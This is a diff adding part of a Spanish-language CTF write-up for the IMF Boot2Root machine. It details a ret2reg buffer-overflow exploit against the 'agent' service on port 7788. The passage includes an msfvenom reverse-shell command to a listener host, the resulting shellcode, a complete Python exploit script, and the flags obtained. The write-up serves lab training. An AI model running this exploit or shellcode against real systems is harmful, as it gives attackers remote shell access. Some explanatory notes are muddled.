@@ -2283,7 +2283,339 @@ bueno como dije vamos a explotar un ret2reg que en resumen es como hay aleatoriz
 with /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm >  
 ```
+entonces mira
 
+si el eax esta en el inicio del programa entonces podriamos hacer un ataque de bof ret2reg
+
+en un ataque ret2reg nosotros prodiamos decirle a el Eip que apunte al eax si eax se encuentra al inicio del programa y luego seguiria mi shell code porque seguiria el esp entonces por ende me interpretaria el shell code
+
+y aqui vemos que eax si esta al inicio y luego seguiria esp donde meteria mi shell code porque le diria a eip ok apuntame a eax que seria lo que esta antes de mi shell code 
+
+```bash
+gef➤  x/16 $eax-4
+0xffffd340:	0x804b02c	0x41414141	0x41414141	0x41414141
+0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
+
+```
+esto seria eax ```0x804b02c``` pero vamos a buscarlo con nsashell haciendo un call eax 
+
+
+entonces como dijimos vamos a usar esta herramienta 
+
+```bash 
+❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > call eax
+00000000  FFD0              call eax
+nasm > Interrupt: use the 'exit' command to quit
+nasm > exit
+
+```
+entonces el call eax en ensamblador seria FF D0 si nosotros tomamos esa direcccion y la filtramos usando ubjet dump -D mas el binario podrimos ver la direccion de eax 
+
+
+
+```bash 
+❯ objdump -D agent | grep "FF D0" -i
+ 8048563:	ff d0                	call   *%eax
+
+```
+como podemos ver la direccion de eax seria ```8048563```
+
+
+entonces lo que seguiria seria hacer un script con un shellcode de 168 bits con metasploit
+
+```bash 
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of py file: 550 bytes
+buf =  b""
+buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
+buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
+buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
+buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
+buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
+buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
+buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
+
+```
+
+aqui tendriamos que revisar si el binario que nos hizo metasploit vale 168 que es lo que vale eip recordemos que eip es el que manda 
+
+
+y en el mismo output dice aqui ```Payload size: 95 bytes```
+
+pero recordemos que para usar el eip necesitamos 168 o sea nos faltan 73 la idea es que te copies esto 
+
+```bash 
+buf =  b""
+buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
+buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
+buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
+buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
+buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
+buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
+buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
+
+```
+
+
+luego vamos a tomar ese script y hacer otro script pero ya manual
+
+
+lo vamos a hacer en python
+
+
+
+
+y aqui agregamos los valores encontrados 
+cuales 
+seria el offset de eip que seria 168  entonces 
+
+
+```bash 
+#!usr/bin/python3
+
+offset = 168
+
+```
+seria el shellcode 
+```bash 
+#!usr/bin/python3
+
+offset = 168
+
+#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode
+
+buf =  b""
+buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
+buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
+buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
+buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
+buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
+buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
+buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
+```
+vamos a definir los 73 que nos faltan 
+
+```bash 
+#!usr/bin/python3
+
+offset = 168
+
+#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode
+
+buf =  b""
+buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
+buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
+buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
+buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
+buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
+buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
+buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
+
+buf += b"A"*(offset-len(buf))
+
+print (len(buf))
+
+```
+
+le diremos que nos printee buf a ver cuanto es para verificar que toodo esta bien 
+
+
+```bash 
+❯ python3 machinecode.py
+168
+
+````
+
+y si todo esta bien eliminemos el print y todo estaria bien 
+
+lo que seguiria seria la llamada a eax
+
+el salto siempre va a ser al reves recordemos que el salto a eax seria ```8048563```
+
+entonces la idea es agreagarlo a el script ```buf += b"\x63\x85\x04\08" #8048563```
+
+```bash 
+#!usr/bin/python3
+
+offset = 168
+
+#Shellcode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f py -v shellcode
+
+buf =  b""
+buf += b"\xb8\xa5\xac\x69\xd6\xdd\xc6\xd9\x74\x24\xf4\x5b"
+buf += b"\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e\x03\xe6"
+buf += b"\xa2\x8b\x23\xd9\x61\xbc\x2f\x4a\xd5\x10\xda\x6e"
+buf += b"\x50\x77\xaa\x08\xaf\xf8\x58\x8d\x9f\xc6\x93\xad"
+buf += b"\xa9\x41\xd5\xc5\xe9\x1a\x41\x20\x82\x58\x8a\x4b"
+buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
+buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
+buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
+
+buf += b"A"*(offset-len(buf))
+
+buf += b"\x63\x85\x04\08" #8048563
+```
+
+ahora la idea es jugar con socket para conectarse al programa y al puerto 7788 donde se esta ejecutando el agent  pero acordemonos que hay que poner un id code y presionar el 3 
+
+primero vamos a definir un descriptor de archivo =s 
+
+socket.socket(socket.AF_INET, socket.SOCK_STREAM) porque es una conexion por tcp  a donde ?
+
+pues nos queremos connectar al localhost porque aqui es donde se esta ejecutando el agent 
+
+s.connect(('127.0.0.1'))
+por cua puerto ?
+
+s.connect(('127.0.0.1, 7788))
+
+con esto solo nos conectamos verdad pero recordemos que hay que darle un id y luego un enter y  luego un 3 y luego un enter y luego enviar el code 
+
+entonces nos vamos a aprovechar de descriptor de archivo para enviar la data  que me intertesa seria
+
+s.send que quieres enviar la data bueno seria (b"48093572") y ahora meteriamos un linefit que funciona como enter entonces seria
+
+s.send(b"48093572\n") 
+
+seria bueno corroborar a ver si nos loggea 
+
+esto lo hariamos con print y recordemos que siempre que recibimos datos hay que decirle al programa que recibimos datos = data = s.recv(1024) 
+
+data = s.recv(1024) 
+
+print data
+
+y vemos que si 
+
+```Login validated```
+ahora borramos print ya que no vale la pena hacer eso solo lo usamos para ver si nos loggeaba 
+
+
+ahora hay que darle al 3 no ? entonces seria s.send(b"3") y luego igual jugamos con un line fit \n s.send(b"3\n")
+
+luego recibimos datos 
+
+data = s.recv(1024) 
+
+y ahora si enviamos la cadena buf 
+
+s.send (buf) pero recordemos que cuando colocabamos las A's habia que darle al enter entonces debemos editar  buf este buf buf += b"\x63\x85\x04\08" #8048563
+
+entonces seria 
+
+```bash 
+       │ File: exploit.py
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ #!/usr/bin/python3
+   2   │ 
+   3   │ import socket
+   4   │ 
+   5   │ offset = 168
+   6   │ 
+   7   │ buf =  b""
+   8   │ buf += b"\xd9\xf6\xb8\x7d\xf9\xd3\x7f\xd9\x74\x24\xf4\x5b"
+   9   │ buf += b"\x29\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x3e"
+  10   │ buf += b"\xea\x31\x8a\xf1\xd7\x41\x96\xa2\xa4\xfe\x33\x46"
+  11   │ buf += b"\xa2\xe0\x74\x20\x79\x62\xe7\xf5\x31\x5c\xc5\x85"
+  12   │ buf += b"\x7b\xda\x2c\xed\xbb\xb4\xab\xd8\x53\xc7\x33\x23"
+  13   │ buf += b"\x1f\x4e\xd2\x93\x39\x01\x44\x80\x76\xa2\xef\xc7"
+  14   │ buf += b"\xb4\x25\xbd\x6f\x29\x09\x31\x07\xdd\x7a\x9a\xb5"
+  15   │ buf += b"\x74\x0c\x07\x6b\xd4\x87\x29\x3b\xd1\x5a\x29"
+  16   │ 
+  17   │ 
+  18   │ #padding
+  19   │ 
+  20   │ buf += b"A"*(offset-len(buf))
+  21   │ 
+  22   │ buf += b"\x63\x85\x04\x08\n" # 8404654651
+  23   │ 
+  24   │ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  25   │ s.connect(('127.0.0.1', 7788))
+  26   │       
+  27   │ s.send(b"48093572\n")
+  28   │ data = s.recv(1024)
+  29   │ s.send(b"3\n")
+  30   │ data = s.recv(1024)
+  31   │ s.send(buf)
+───────┴──────────────────
+
+````
+who ami 
+
+```bash 
+cat Flag.txt
+flag6{R2gwc3RQcm90MGMwbHM=}
+```
+cat
+
+```bash 
+❯ echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo ""
+Gh0stProt0c0ls
+
+```
+last flag
+
+```bash 
+cat TheEnd.txt
+   ____                        _ __   __   
+  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
+ _/ //  ' \/ _ \/ _ \(_-<(_-</ / _ \/ / -_)
+/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
+   __  __/_/        _                      
+  /  |/  (_)__ ___ (_)__  ___              
+ / /|_/ / (_-<(_-</ / _ \/ _ \             
+/_/__/_/_/___/___/_/\___/_//_/             
+  / __/__  ___________                     
+ / _// _ \/ __/ __/ -_)                    
+/_/  \___/_/  \__/\__/                     
+                                           
+Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
+Thank you for trying this challenge and please send any feedback.
+
+Geckom
+Twitter: @g3ck0ma
+Email: geckom@redteamr.com
+Web: http://redteamr.com
+
+Special Thanks
+Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
+Web Advice: Menztrual (@menztrual)
+Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
+root@imf:/root# 
+
+```
+
+
+a la direccion a la que lo queremos enviar y vear si nos tramita una direccion ip 
+
+aja y que mas pues como el code que hicimos en metasploit esta hehco para que envie una traza a el puerto 443 
+
+entonces di vamos a ponernos en escucha del puerto 443 entonces se supone que si root esta ejeecutando este programa me daria una reverseshell al puerto 443 
+
+esperemos a ver porque nosotros no lo sabemos pero aun asi vimo un usuario que se llama setup talvez usando este usuario podriamos ganar acceso pero vamos a hacerlo a ver si funka
+
+
+
+luego tendriamos que hacer la llamada
+
+
+
+
+entonces lo suyo seria buscar donde comienza eax y con esto podemos usar 
 output 
 ```bash 
 nasm > call eax
